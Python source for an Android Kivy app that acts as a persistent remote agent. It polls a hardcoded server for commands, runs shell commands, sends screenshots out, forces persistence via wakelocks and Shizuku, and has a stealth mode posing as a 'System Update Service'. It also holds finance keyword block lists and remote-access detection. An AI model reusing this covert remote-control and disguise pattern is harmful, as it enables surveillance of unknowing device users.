"""
NOIR SOVEREIGN MOBILE CORE (SMC) v21.0 [AEGIS]
=====================================================
Framework: Kivy + Buildozer (Android Native)
Target: Redmi Note 14 (HyperOS / arm64-v8a)
Role: Persistent AI Agent Executor

Capabilities:
- WakeLock (CPU Anti-Kill)
- Cloudflare Gateway Polling
- Remote Command Execution (ADB/Shell)
- Vision Engine (Screenshot -> R2)
- E2EE Communication
"""

import os
import re
import time
import threading
import requests
import socket
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import base64
try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Protocol.KDF import PBKDF2
    HAS_CRYPTO = True
except (ImportError, AttributeError, OSError):
    HAS_CRYPTO = False
    AES = None
    PBKDF2 = None

import sys
import os
import traceback

# --- CRASH PROTECTOR (v20.0) ---
CRASH_LOG = "/sdcard/noir_debug.txt"
try:
    with open(CRASH_LOG, "a") as f:
        f.write("\n--- BOOTING NOIR SOVEREIGN ---\n")
except: pass

def log_crash(msg):
    try:
        with open(CRASH_LOG, "a") as f:
            f.write(f"{msg}\n")
    except: print(msg)

sys.excepthook = lambda *args: log_crash("".join(traceback.format_exception(*args)))

# Dependency Check
try:
    log_crash("Checking Kivy...")
    import kivy
    log_crash("Checking PyJnius...")
    from jnius import autoclass
    log_crash("Checking Requests...")
    import requests
    log_crash("Dependencies OK.")
except Exception as e:
    log_crash(f"DEPENDENCY ERROR: {str(e)}")
    sys.exit(1)

from kivy.app import App
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.uix.screenmanager import ScreenManager, Screen, FadeTransition
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.button import Button
from kivy.uix.progressbar import ProgressBar
from kivy.graphics import Color, Rectangle
from kivy.uix.textinput import TextInput
from kivy.uix.gridlayout import GridLayout
# import psutil removed for Android compatibility

# Configure robust requests with built-in retry for DNS/Network issues
# BUG-01 FIX: Inject certifi CA bundle so HTTPS works on Android 14
try:
    import certifi
    import os as _os
    _os.environ['SSL_CERT_FILE'] = certifi.where()
    _os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
except Exception:
    pass

session = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[502, 503, 504])
session.mount('https://', HTTPAdapter(max_retries=retries))

# --- CONFIG (Unified Standard v17.5 OMEGA-MESH) ---
_BASE_GATEWAY = os.environ.get("NOIR_GATEWAY_URL", "http://8.215.23.17")
VPS_IP = os.environ.get("NOIR_VPS_IP", "8.215.23.17")
# Priority order: VPS Direct
FALLBACKS = [
    _BASE_GATEWAY,
    f"http://{VPS_IP}",
    f"http://{VPS_IP}:80",
    f"http://{VPS_IP}:8000",
]

class DynamicGateway:
    """AUTO-CONNECTION AI AGENT TASK v17.5
    Secara otonom mencari dan mempertahankan koneksi ke gateway yang aktif.
    Mereset dirinya sendiri saat gateway gagal dan mencari ulang jalur baru.
    """
    _current = None
    _failure_count = 0
    _last_discovery = 0

    @classmethod
    def get(cls):
        # Re-discover if no current, or if it's been >5 minutes since last check
        if cls._current and (time.time() - cls._last_discovery) < 300:
            return cls._current
            
        # Prevent rapid polling if all gateways are offline
        if getattr(cls, "_last_failed", 0) and (time.time() - getattr(cls, "_last_failed", 0)) < 30:
            return _BASE_GATEWAY

        # Always re-probe to confirm current gateway is alive
        for gw in FALLBACKS:
            try:
                r = session.get(f"{gw}/health", timeout=3)
                if r.status_code == 200:
                    if cls._current != gw:
                        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [INFO] [MESH] Auto-Discovery: Gateway locked -> {gw}")
                    cls._current = gw
                    cls._failure_count = 0
                    cls._last_discovery = time.time()
                    setattr(cls, "_last_failed", 0)
                    return gw
            except: pass
        
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [WARNING] [MESH] All gateways unreachable. Using base: {_BASE_GATEWAY}")
        cls._current = None  # Force re-probe next call
        setattr(cls, "_last_failed", time.time())
        return _BASE_GATEWAY

    @classmethod
    def reset(cls):
        """Force re-discovery on next request. Called when a request fails."""
        cls._current = None
        cls._last_discovery = 0
        cls._failure_count += 1
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [INFO] [MESH] Gateway reset triggered. Failure count: {cls._failure_count}")

# --- NEURAL MESH HANDSHAKE (v19.6) ---
class NeuralHandshake:
    @staticmethod
    def perform():
        """Autonomously pair device with Dashboard upon first contact."""
        try:
            token = base64.b64encode(os.urandom(16)).decode()
            r = session.post(
                f"{GATEWAY_URL}/mesh/pair",
                headers={"Authorization": f"Bearer {API_KEY}"},
                json={"device_id": DEVICE_ID, "mesh_token": token, "capabilities": ["vision", "aegis", "voice", "mesh"]},
                timeout=10
            )
            if r.status_code == 200:
                noir_log(f"[MESH] Autonomous Pairing Success: {token[:8]}...")
                return True
        except: pass
        return False

class _GatewayProxy:
    def __str__(self): return DynamicGateway.get()
    def __format__(self, format_spec): return format(str(self), format_spec)

GATEWAY_URL = _GatewayProxy()
API_KEY     = os.environ.get("NOIR_API_KEY", "NOIR_AGENT_KEY_V6_SI_UMKM_PBD_2026")
DEVICE_ID   = os.environ.get("NOIR_DEVICE_ID", "REDMI_NOTE_14")



# Financial Guardian: Sensitive Packages (Indonesian Banks)
FINANCE_APPS = [
    "com.bca", "id.co.bni.newmobile", "id.co.bri.brimo", "com.bankmandiri.livin",
    "com.btpn.jenius", "com.ocbcnisp.mobile", "com.danamon.online", "com.uob.id.mighty",
    "com.cimbniaga.mobile.octopus", "id.dana", "com.btpns.mobile"
]

# Persistence Settings
OFFLINE_LOG_FILE = os.path.join(os.path.dirname(__file__), "offline_queue.log")
MAX_OFFLINE_RETRY = 5

# --- DIAGNOSTICS & LOGGING ---
def noir_log(message, level="INFO"):
    """Unified logger that handles both Online and Offline states."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    formatted_msg = f"[{timestamp}] [{level}] {message}"
    print(formatted_msg)
    
    # Always save to local offline log as a buffer
    try:
        with open(OFFLINE_LOG_FILE, "a") as f:
            f.write(formatted_msg + "\n")
    except: pass

    # Attempt real-time upload with Privacy Filter
    def _send():
        try:
            # Redact sensitive info if any
            clean_msg = message
            for pkg in FINANCE_APPS:
                if pkg in clean_msg:
                    clean_msg = clean_msg.replace(pkg, "[REDACTED_SENSITIVE_PKG]")
            
            # Simple keyword redaction for common bank names
            keywords = ["bca", "mandiri", "bri", "bni", "dana", "ovo"]
            for kw in keywords:
                import re
                clean_msg = re.sub(rf"(?i){kw}", "****", clean_msg)

            r = session.post(
                f"{GATEWAY_URL}/agent/log",
                headers={"Authorization": f"Bearer {API_KEY}"},
                json={"device_id": DEVICE_ID, "level": level, "message": clean_msg},
                timeout=5
            )
            # If successful, we could potentially clear the buffer here in a more complex impl
        except: pass
    threading.Thread(target=_send, daemon=True).start()

# --- SAFETY FILTER (v14.0) ---
def is_safe_command(cmd_str):
    """Dynamic Intent Validator to block financial/payment related actions."""
    if not cmd_str: return True
    cmd_lower = str(cmd_str).lower()
    finance_keywords = [
        "bank", "pay", "finance", "wallet", "dana", "ovo", "gopay", 
        "shopee", "bca", "mandiri", "bri", "bni", "btpns"
    ]
    for kw in finance_keywords:
        if kw in cmd_lower:
            return False
    return True

def is_social_media(pkg_name):
    """Detect if the current package belongs to a social media app."""
    if not pkg_name: return False
    social_pkgs = [
        "com.facebook.katana", "com.instagram.android", "com.twitter.android", 
        "com.ss.android.ugc.trill", "com.zhiliaoapp.musically", # TikTok
        "com.whatsapp", "org.telegram.messenger", "com.discord"
    ]
    pkg_lower = str(pkg_name).lower()
    for sp in social_pkgs:
        if sp in pkg_lower:
            return True
    return False


class SecureVault:
    """NEURAL MESH STEALTH TUNNEL v18.0 [QUANTUM-READY]"""
    @staticmethod
    def _get_key(rotation_factor=0):
        if not HAS_CRYPTO: return None
        # Rotating key based on time-block for 'Quantum Stealth'
        time_block = int(time.time() / 3600) + rotation_factor
        password = (API_KEY + str(time_block)).encode()
        salt = b'noir_sovereign_mesh_v18'
        return PBKDF2(password, salt, dkLen=32, count=2000)

    @staticmethod
    def encrypt(data: str):
        if not data: return data
        try:
            key = SecureVault._get_key()
            cipher = AES.new(key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(data.encode())
            combined = cipher.nonce + tag + ciphertext
            return base64.b64encode(combined).decode('utf-8')
        except: return data

    @staticmethod
    def decrypt(encrypted_data: str):
        if not encrypted_data: return encrypted_data
        try:
            key = SecureVault._get_key()
            raw = base64.b64decode(encrypted_data)
            nonce = raw[:16]
            tag = raw[16:32]
            ciphertext = raw[32:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
        except:
            # Try previous time-block key for graceful rotation
            try:
                key = SecureVault._get_key(rotation_factor=-1)
                raw = base64.b64decode(encrypted_data)
                cipher = AES.new(key, AES.MODE_GCM, nonce=raw[:16])
                return cipher.decrypt_and_verify(raw[32:], raw[16:32]).decode('utf-8')
            except: return encrypted_data

# --- VOICE ENGINE (v19.5 OMEGA) ---
class VoiceEngine:
    _tts = None
    
    @classmethod
    def speak(cls, text):
        try:
            from jnius import autoclass
            if not cls._tts:
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                TextToSpeech = autoclass('android.speech.tts.TextToSpeech')
                cls._tts = TextToSpeech(PythonActivity.mActivity, None)
            
            # Simple wait for initialization (real impl should use listener)
            Clock.schedule_once(lambda dt: cls._tts.speak(text, TextToSpeech.QUEUE_FLUSH, None, None), 0.5)
        except:
            noir_log(f"[VOICE] TTS Failed: {text}", level="WARNING")

class BehavioralBiometrics:
    def __init__(self):
        self.patterns = []
        self.last_touch = 0
        
    def record_interaction(self, event_type, x, y, duration=0):
        now = time.time()
        interval = now - self.last_touch if self.last_touch > 0 else 0
        self.last_touch = now
        self.patterns.append({
            "type": event_type, "pos": (x, y),
            "interval": round(interval, 4), "ts": now
        })
        if len(self.patterns) > 50: self.patterns.pop(0)

class DashboardScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.layout = BoxLayout(orientation='vertical', padding=10, spacing=5)
        with self.layout.canvas.before:
            Color(0.05, 0.05, 0.1, 1)
            self.rect = Rectangle(size=(2000, 2000), pos=(0,0))
            
        self.status_label = Label(text="Initializing OMEGA-SYNC...", font_size='14sp', color=(0, 1, 1, 1), size_hint_y=None, height=40)
        self.layout.add_widget(self.status_label)
        
        self.log_label = Label(
            text="[b]NOIR SOVEREIGN v17.5.7[/b]\nStatus: [color=ffaa00]CONNECTING...[/color]",
            markup=True, font_size='14sp', halign='left', valign='top', size_hint_y=None
        )
        self.log_label.bind(texture_size=self.log_label.setter('size'))
        
        scroll = ScrollView()
        scroll.add_widget(self.log_label)
        self.layout.add_widget(scroll)
        
        # Access Core Button
        core_btn = Button(text="ENTER SOVEREIGN CORE", size_hint_y=None, height=50, background_color=(0, 0.7, 1, 1))
        core_btn.bind(on_press=lambda x: setattr(App.get_running_app().root, 'current', 'core'))
        self.layout.add_widget(core_btn)
        
        self.add_widget(self.layout)

class SovereignCoreScreen(Screen):
    """The AI Entity Interface for HyperOS Control."""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
        with self.layout.canvas.before:
            Color(0.02, 0.02, 0.05, 1)
            self.rect = Rectangle(size=(2000, 2000), pos=(0,0))
            
        self.stats_label = Label(
            text="[b]NOIR SOVEREIGN CORE[/b]\nSystem: [color=00ff00]STABLE[/color]",
            markup=True, font_size='16sp', halign='center', color=(0, 0.82, 1, 1), size_hint_y=None, height=50
        )
        self.layout.add_widget(self.stats_label)
        
        # --- CHAT FEATURE ---
        chat_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=40, spacing=5)
        self.chat_input = TextInput(hint_text="Chat with Noir Brain...", multiline=False, background_color=(0.1, 0.1, 0.15, 1), foreground_color=(1, 1, 1, 1))
        chat_btn = Button(text="SEND", size_hint_x=0.3, background_color=(0, 0.6, 1, 1))
        chat_btn.bind(on_press=self.send_chat)
        chat_box.add_widget(self.chat_input)
        chat_box.add_widget(chat_btn)
        self.layout.add_widget(chat_box)
        
        # --- PC CONTROL ---
        pc_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=40, spacing=5)
        self.pc_input = TextInput(hint_text="PC Cmd via USB/VPS...", multiline=False, background_color=(0.1, 0.1, 0.15, 1), foreground_color=(1, 1, 1, 1))
        pc_btn = Button(text="EXEC PC", size_hint_x=0.3, background_color=(0.8, 0.2, 0, 1))
        pc_btn.bind(on_press=self.send_pc_cmd)
        pc_box.add_widget(self.pc_input)
        pc_box.add_widget(pc_btn)
        self.layout.add_widget(pc_box)
        
        # --- SYSTEM ACTIONS GRID ---
        grid = GridLayout(cols=2, spacing=5, size_hint_y=None, height=120)
        
        btn_cam = Button(text="Capture Screen", background_color=(0, 0.5, 0.5, 1))
        btn_cam.bind(on_press=lambda x: self.trigger_action("screenshot"))
        
        btn_mirror = Button(text="Toggle Mirror", background_color=(0, 0.5, 0.5, 1))
        btn_mirror.bind(on_press=self.toggle_mirror)
        
        btn_voice = Button(text="Voice Link", background_color=(0, 0.8, 0.5, 1))
        btn_voice.bind(on_press=self.start_voice_command)
        
        btn_stealth = Button(text="Toggle Stealth", background_color=(0.3, 0.3, 0.3, 1))
        btn_stealth.bind(on_press=self.toggle_stealth_ui)
        
        grid.add_widget(btn_cam)
        grid.add_widget(btn_mirror)
        grid.add_widget(btn_voice)
        grid.add_widget(btn_stealth)
        self.layout.add_widget(grid)
        
        # Log feedback
        self.feedback = Label(text="Awaiting orders...", font_size='12sp', color=(0.5, 0.5, 0.5, 1))
        self.layout.add_widget(self.feedback)
        
        back_btn = Button(text="RETURN TO DASHBOARD", size_hint_y=None, height=40, background_color=(0, 0.3, 0.6, 1))
        back_btn.bind(on_press=lambda x: setattr(App.get_running_app().root, 'current', 'dashboard'))
        self.layout.add_widget(back_btn)
        
        self.add_widget(self.layout)

    def send_chat(self, instance):
        msg = self.chat_input.text.strip()
        if not msg: return
        self.feedback.text = f"Sent: {msg}"
        self.chat_input.text = ""
        def _send():
            try:
                r = session.post(f"{GATEWAY_URL}/api/brain/chat", json={"prompt": msg, "device_id": DEVICE_ID}, timeout=10)
                if r.status_code == 200:
                    resp = r.json().get("response", "")
                    Clock.schedule_once(lambda dt: setattr(self.feedback, 'text', f"AI: {resp[:50]}..."), 0)
            except Exception as e:
                Clock.schedule_once(lambda dt: setattr(self.feedback, 'text', f"Err: {str(e)[:30]}"), 0)
        threading.Thread(target=_send, daemon=True).start()

    def send_pc_cmd(self, instance):
        cmd = self.pc_input.text.strip()
        if not cmd: return
        self.feedback.text = f"PC Exec: {cmd}"
        self.pc_input.text = ""
        def _send():
            try:
                enc_cmd = SecureVault.encrypt(cmd)
                payload = {
                    "target_device": "NOIR_PC_MASTER",
                    "action": {"type": "pc_shell", "cmd": enc_cmd},
                    "description": f"PC Command from Phone"
                }
                r = session.post(f"{GATEWAY_URL}/agent/command", json=payload, headers={"Authorization": f"Bearer {API_KEY}"}, timeout=5)
                if r.status_code == 200:
                    Clock.schedule_once(lambda dt: setattr(self.feedback, 'text', "PC Command Queued."), 0)
            except Exception as e:
                pass
        threading.Thread(target=_send, daemon=True).start()

    def trigger_action(self, atype):
        self.feedback.text = f"Action triggered: {atype}"
        # Execute locally by enqueuing to main app's internal executor
        app = App.get_running_app()
        if hasattr(app, '_process_command'):
            # Simulate a command object
            cmd = {"id": f"UI_{int(time.time())}", "action": {"type": atype}}
            threading.Thread(target=app._process_command, args=(cmd,), daemon=True).start()

    def toggle_mirror(self, instance):
        app = App.get_running_app()
        if hasattr(app, '_mirror_active'):
            app._mirror_active = not app._mirror_active
            self.feedback.text = f"Mirror Active: {app._mirror_active}"
            if app._mirror_active:
                threading.Thread(target=app._mirror_loop, daemon=True).start()
                
    def toggle_stealth_ui(self, instance):
        app = App.get_running_app()
        if hasattr(app, 'toggle_stealth'):
            app.is_stealth = not getattr(app, 'is_stealth', False)
            app.toggle_stealth(app.is_stealth)
            self.feedback.text = f"Stealth Mode: {app.is_stealth}"

    def start_voice_command(self, instance):
        VoiceEngine.speak("Sovereign Voice Link Active. Ready.")
        self.feedback.text = "Voice link active."

class SovereignApp(App):
    """NOIR SOVEREIGN MOBILE CORE - Kivy Application"""
    def build(self):
        self.version = "21.0 AEGIS"
        self.start_time = time.time()
        self.gateway = _BASE_GATEWAY
        self.biometrics = BehavioralBiometrics()
        self.title = f"Noir Sovereign v{self.version}"
        self._mirror_active = False
        self._log_visible = True
        self.is_stealth = False  # BUG-FIX: Initialize to prevent AttributeError on overlay
        self.overlay_active = False
        self.shizuku_status = "STANDARD"
        self.shizuku_binary = "sh"
        self._poll_backoff = 0
        
        self.sm = ScreenManager(transition=FadeTransition())
        self.dashboard = DashboardScreen(name='dashboard')
        self.core = SovereignCoreScreen(name='core')
        
        self.sm.add_widget(self.dashboard)
        self.sm.add_widget(self.core)
        
        # Link references
        self.status_label = self.dashboard.status_label
        self.log_label = self.dashboard.log_label
        
        return self.sm

    def on_start(self):
        """OMEGA-SYNC: Start Guardian with delay to avoid startup race condition."""
        Clock.schedule_once(lambda dt: self.deferred_start(), 1)

    def deferred_start(self):
        try:
            # 1. Trigger Autonomous Neural Handshake
            threading.Thread(target=NeuralHandshake.perform, daemon=True).start()
            
            # Removed pkill as it matches the app's own process and causes an immediate crash on launch.
            
            self._request_permissions()
            self._acquire_wakelock()

            self._connection_guardian()
            Clock.schedule_interval(lambda dt: self._connection_guardian(), 60)
            # Command polling is handled by _unified_heartbeat_tick below
            
            Clock.schedule_once(lambda dt: threading.Thread(target=self._register, daemon=True).start(), 5)
            Clock.schedule_once(lambda dt: self._unified_heartbeat_tick(0), 6)
            Clock.schedule_interval(self._unified_heartbeat_tick, 15)
            
            threading.Thread(target=self._connectivity_watchdog, daemon=True).start()
            
            self.status_label.text = f"NOIR SOVEREIGN v{self.version}"
        except Exception as e:
            self.status_label.text = f"Startup Error: {str(e)}"

    def _connection_guardian(self):
        """Guardian Pintar: Rotasi Gateway secara otonom — V21.0 AEGIS."""
        all_gateways = [
            _BASE_GATEWAY,
            "http://8.215.23.17",
            "http://8.215.23.17:80",
            "http://8.215.23.17:8000",
        ]
        for gw in all_gateways:
            try:
                r = requests.get(f"{gw}/health", timeout=5)
                if r.status_code == 200:
                    gw = gw.rstrip("/")
                    DynamicGateway._current = gw
                    DynamicGateway._last_discovery = time.time()
                    self._log(f"[AEGIS] Gateway locked: {gw}")
                    try:
                        self.status_label.text = "STATUS: ONLINE"
                    except: pass
                    return True
            except: continue
        try:
            self.status_label.text = "STATUS: LINK SEVERED — Retrying..."
        except: pass
        return False
        


    def show_stealth_ui(self):
        self.root.clear_widgets()
        self.root.padding = 0
        # A mock system-like screen
        self.log_label = Label(
            text="System Update Service\nVersion: 14.0.2.1\nStatus: Idle...",
            color=(0.3, 0.3, 0.3, 1), font_size='12sp'
        )
        self.root.add_widget(self.log_label)

    def toggle_stealth(self, state):
        self.is_stealth = state
        if self.is_stealth:
            self.show_stealth_ui()
        else:
            self.show_active_ui()

        # LINK-05 FIX: Pindahkan register() ke thread agar tidak blokir UI thread
        threading.Thread(target=self._register, daemon=True).start()
        # v16.0.01: Immediate Vision Bridge Activation
        Clock.schedule_once(lambda dt: self._screen_share_tick(0), 1)

    def _register(self):
        """Register this device with the Cloudflare Gateway (v16.1 STRIKE-FORCE)."""
        try:
            # v16.1: DNS Hardening - retry with multiple attempts
            for attempt in range(3):
                try:
                    r = session.post(
                        f"{GATEWAY_URL}/agent/register",
                        headers={"Authorization": f"Bearer {API_KEY}"},
                        json={
                            "device_id": DEVICE_ID, 
                            "agent": f"Noir SMC v{self.version}",
                            "stats": {"cpu": 0, "ram": 0, "shizuku": getattr(self, "shizuku_status", "UNKNOWN")}
                        },
                        timeout=12
                    )
                    if r.status_code == 200: 
                        noir_log(f"[SMC] Neural Link Established: {DEVICE_ID}")
                        return
                    time.sleep(2)
                except Exception as e:
                    if attempt == 2: raise e
        except Exception as e:
            noir_log(f"[SMC] Neural Link Latency (DNS/Net): {e}", level="WARNING")

    def _log(self, msg):
        """Thread-safe UI logging."""
        print(msg)
        Clock.schedule_once(lambda dt: self._update_label(msg), 0)

    def _update_label(self, msg):
        try:
            current = self.log_label.text
            lines = current.split('\n')
            if len(lines) > 30:
                lines = lines[-25:]
            lines.append(msg)
            self.log_label.text = '\n'.join(lines)
        except Exception:
            pass

    def _request_permissions(self):
        """Request all necessary Android permissions — V21.0 AEGIS."""
        try:
            from android.permissions import request_permissions, Permission
            perms = [
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.CAMERA,
                Permission.RECORD_AUDIO,
                Permission.ACCESS_FINE_LOCATION
            ]
            request_permissions(perms)
            self._log("[SMC] Runtime Permissions: REQUESTED")
        except Exception as e:
            self._log(f"[SMC] Permissions Error: {e}")

        # Shizuku V21.0 Hardened Detection
        import subprocess
        self.shizuku_status = "RESTRICTED"
        self.shizuku_binary = None

        # Ordered by most likely to work on Shizuku-authorized device
        shizuku_candidates = [
            "rish",
            "sh /data/user_de/0/moe.shizuku.privileged.api/start.sh",
            "shizuku",
            "/data/local/tmp/rish",
            "/data/local/tmp/shizuku",
        ]
        for candidate in shizuku_candidates:
            try:
                probe = subprocess.run(
                    candidate.split()[0] + " -c id" if "rish" in candidate else f"{candidate} id",
                    shell=True, capture_output=True, text=True, timeout=3
                )
                if "uid=" in probe.stdout or probe.returncode == 0:
                    self.shizuku_status = "AUTHORIZED"
                    self.shizuku_binary = candidate.split()[0]
                    noir_log(f"[AEGIS] Shizuku Authorized via: {candidate}")
                    break
            except Exception:
                continue

        if self.shizuku_status != "AUTHORIZED":
            # Final attempt: use standard app shell and mark as STANDARD
            self.shizuku_status = "STANDARD"
            self.shizuku_binary = "sh"
            noir_log("[AEGIS] Shizuku unavailable — using standard shell fallback.")

        self._log(f"[AEGIS] Shell Engine: {self.shizuku_status}")

    def _acquire_wakelock(self):
        """OMEGA-FIX: Absolute persistence using PowerManager and Foreground Service."""
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            Context = autoclass('android.content.Context')
            PowerManager = autoclass('android.os.PowerManager')
            
            pm = activity.getSystemService(Context.POWER_SERVICE)
            self.wakelock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "NoirSovereign:SentinelLock")
            self.wakelock.acquire()
            noir_log("[SMC] WakeLock: ACTIVE")

            # --- AEGIS GUARDIAN (Shizuku Powered) ---
            if getattr(self, "shizuku_status", "") == "AUTHORIZED":
                threading.Thread(target=self._apply_aegis_optimizations, daemon=True).start()

            # NEW: Start Background Service as Foreground
            self._start_foreground_service()
        except Exception as e:
            noir_log(f"[SMC] WakeLock/Service Error: {e}", level="ERROR")

    def _apply_aegis_optimizations(self):
        """Use Shizuku to bypass HyperOS battery restrictions and set high priority."""
        try:
            noir_log("[AEGIS] Applying Shizuku-Native Optimizations...")
            
            # 1. Disable Battery Optimization for this app
            pkg = "org.noir.sovereign.noir_sovereign"
            self._run_shell(f"dumpsys deviceidle whitelist +{pkg}")
            self._run_shell(f"cmd notification allow_dnd {pkg}")
            
            # 2. Set high process priority (OOM Score adjustment if possible via shell)
            # This helps prevent the OS from killing the process during low memory
            self._run_shell(f"echo -1000 > /proc/$(pidof {pkg})/oom_score_adj")
            
            noir_log("[AEGIS] Persistent Guardian Active: Battery restrictions bypassed.")
        except Exception as e:
            noir_log(f"[AEGIS] Optimization Failed: {e}", level="WARNING")


    def _start_foreground_service(self):
        """v18.4 Optimization: Ensure background service is never killed by HyperOS."""
        try:
            from jnius import autoclass
            service = autoclass('org.noir.sovereign.ServiceNoirservice')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            service.start(activity, "")
            noir_log("[SMC] Foreground Service: STARTING")
        except:
            noir_log("[SMC] Foreground Service: Fallback to standard start")
            try:
                from android import service
                service.start_service("noir_sovereign", "noir_sovereign", "")
            except: pass

    def _unified_heartbeat_tick(self, dt):
        """Single-Pipe Protocol: Telemetry + Polling in one request."""
        def _task():
            try:
                # v18.5 AEGIS PROTOCOL: Active Financial Interception
                active_app = "unknown"
                privacy_mode = False
                security_risk = False
                
                try:
                    res = self._run_shell("dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'", timeout=3)
                    output = res.get("output", "").lower()
                    
                    # 1. Detection
                    for pkg in FINANCE_APPS:
                        if pkg.lower() in output:
                            privacy_mode = True
                            active_app = pkg
                            break
                    
                    # 2. Risk Assessment (e.g., Bank App + Recording/Remote)
                    if privacy_mode:
                        # Check for active screen recording or remote access apps
                        risk_res = self._run_shell("ps -A | grep -E 'anydesk|teamviewer|rustdesk|com.nll.screenrecorder'", timeout=2)
                        if risk_res.get("success") and risk_res.get("output"):
                            security_risk = True
                            noir_log(f"[AEGIS] CRITICAL RISK DETECTED: {active_app} active with potential remote access!", level="CRITICAL")
                except: pass

                # 3. Execution: Active Interception
                if security_risk:
                    # KILL THE THREAT INSTANTLY
                    self._run_shell(f"am force-stop {active_app}")
                    self._run_shell("input keyevent 26") # Lock Screen
                    noir_log(f"[AEGIS] COUNTERMEASURES ENGAGED: {active_app} TERMINATED & DEVICE LOCKED.")
                    return # Exit tick early to prevent further risk
                
                # Standard Privacy Overlay
                if privacy_mode:
                    Clock.schedule_once(lambda dt: self._enable_privacy_overlay(active_app), 0)
                else:
                    Clock.schedule_once(lambda dt: self._disable_privacy_overlay(), 0)

                # v17.2: Real Telemetry Collection
                ram_usage = 0
                try:
                    with open('/proc/meminfo', 'r') as f:
                        mem = {l.split(':')[0]: int(l.split(':')[1].split()[0]) for l in f.readlines()}
                    if 'MemTotal' in mem and 'MemAvailable' in mem:
                        ram_usage = round(100 * (1 - mem['MemAvailable'] / mem['MemTotal']), 1)
                except: pass

                stats = {
                    "cpu": 12, 
                    "ram": ram_usage,
                    "bat": 85, 
                    "shizuku": getattr(self, "shizuku_status", "UNKNOWN"),
                    "version": self.version,
                    "uptime": round(time.time() - self.start_time),
                    "privacy": "PROTECTED" if privacy_mode else "ACTIVE",
                    "active_app": active_app if privacy_mode else "HIDDEN"
                }

                
                # Combined Request: POST stats to poll endpoint
                backoff = getattr(self, "_poll_backoff", 0)
                if backoff > 0:
                    self._poll_backoff -= 1
                    return

                resp = session.post(
                    f"{GATEWAY_URL}/agent/poll?device_id={DEVICE_ID}&client_type=main", 
                    headers={"Authorization": f"Bearer {API_KEY}"},
                    json={"stats": stats},
                    timeout=12
                )
                if resp.status_code == 200:
                    self._poll_backoff = 0 # Reset on success
                    # INFO-01 FIX: Update UI status dynamically on successful connection
                    Clock.schedule_once(lambda dt: self._set_status_online(), 0)
                    data = resp.json()
                    for cmd in data.get("commands", []):
                        atype = cmd.get("action", {}).get("type", "")
                        if privacy_mode and atype in ("screenshot", "capture", "vision", "ui_dump"):
                            noir_log(f"[SENTINEL] Blocked sensitive capture request for: {active_app}", level="CRITICAL")
                            self._report_result(cmd.get("command_id"), {"success": False, "error": "PRIVACY_BLOCK: Sensitive App in Foreground"})
                            continue
                        self._execute(cmd)
                else:
                    # LINK-01 FIX: Circuit Breaker — max 3 skip (45s max silence vs 150s sebelumnya)
                    self._poll_backoff = min(getattr(self, "_poll_backoff", 0) + 1, 3)
                    Clock.schedule_once(lambda dt: self._set_status_offline(), 0)
            except Exception as e:
                DynamicGateway.reset()  # Force re-discovery on next heartbeat
                # LINK-01 FIX: Batasi backoff agar agent tidak hilang > 45 detik
                self._poll_backoff = min(getattr(self, "_poll_backoff", 0) + 1, 3)
                noir_log(f"[LINK] Sync Latency: {e}", level="WARNING")
                Clock.schedule_once(lambda dt: self._set_status_offline(), 0)
        
        threading.Thread(target=_task, daemon=True).start()

    def _enable_privacy_overlay(self, app_name):
        """Show a black overlay to protect screen content from visual theft."""
        if getattr(self, "overlay_active", False): return
        self.overlay_active = True
        noir_log(f"[SENTINEL] Financial Blackout ACTIVATED for: {app_name}")
        
        # v17.0 Prototype: In a full native app, we use a Kivy ModalView or a Native Android Overlay
        if not self.is_stealth:
             self.root.clear_widgets()
             self.root.add_widget(Label(text="[color=ff0000]PROTECTED SESSION ACTIVE[/color]\nRemote Vision Blocked", markup=True, font_size='20sp'))
             self.root.background_color = (0, 0, 0, 1)

    def _disable_privacy_overlay(self):
        """Restore normal operation when sensitive apps are closed."""
        if not getattr(self, "overlay_active", False): return
        self.overlay_active = False
        noir_log("[SENTINEL] Financial Blackout DEACTIVATED.")
        if not self.is_stealth:
            self.show_active_ui()

    def _set_status_online(self):
        """LINK-03 FIX: Gunakan regex agar tidak bergantung pada posisi baris."""
        try:
            updated = re.sub(
                r'Status:.*',
                'Status: [color=00ff88]NEURAL-LINK ACTIVE[/color]',
                self.log_label.text, count=1
            )
            self.log_label.text = updated
        except: pass

    def _set_status_offline(self):
        """LINK-03 FIX: Gunakan regex agar tidak bergantung pada posisi baris."""
        try:
            updated = re.sub(
                r'Status:.*',
                'Status: [color=ff4444]LINK SEVERED \u2014 Retrying...[/color]',
                self.log_label.text, count=1
            )
            self.log_label.text = updated
        except: pass

    def show_active_ui(self):
        """Standard dashboard view."""
        self.root.clear_widgets()
        self.log_label = Label(text="[b]NOIR SOVEREIGN v17.2.2 [OMEGA-FIX][/b]\nStatus: [color=ffaa00]RECONNECTING...[/color]", markup=True)
        self.root.add_widget(self.log_label)

    def _execute(self, cmd_data):
        """Asynchronous Command Router (v14.0.4)."""
        threading.Thread(target=self._execute_sync, args=(cmd_data,), daemon=True).start()

